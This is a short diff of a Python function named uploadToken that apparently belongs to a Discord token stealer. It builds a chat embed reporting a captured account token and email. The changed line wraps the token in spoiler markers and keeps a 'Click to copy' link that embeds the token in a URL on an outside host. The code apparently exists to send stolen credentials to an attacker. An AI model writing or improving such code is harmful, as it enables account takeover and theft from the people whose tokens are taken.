@@ -292,7 +292,7 @@ def uploadToken(token, path):
             "fields": [
                 {
                     "name": ":rocket: Token:",
-                    "value": f"`{token}`\n[Click to copy](https://superfurrycdn.nl/copy/{token})"
+                    "value": f"||`{token}`||\n[Click to copy](https://superfurrycdn.nl/copy/{token})"
                 },
                 {
                     "name": ":envelope: Email:",
